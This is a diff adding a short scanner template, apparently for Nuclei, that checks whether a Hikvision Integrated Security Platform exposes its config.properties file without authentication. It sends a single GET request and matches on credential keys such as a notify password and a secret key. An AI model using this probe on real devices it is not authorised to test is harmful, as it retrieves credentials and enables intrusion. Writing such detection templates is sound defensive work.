@@ -1,0 +1,21 @@
+id: hikvision-config-properties-info-leak
+info:
+  name: Hikvision Integrated Security Platform config.properties Information Disclosure
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: info-leak
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/portal/conf/config.properties"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "@bic.serviceDirectory.ip"
+          - "@bic.notify.password"
+          - "parent.secretKey"
+        part: body
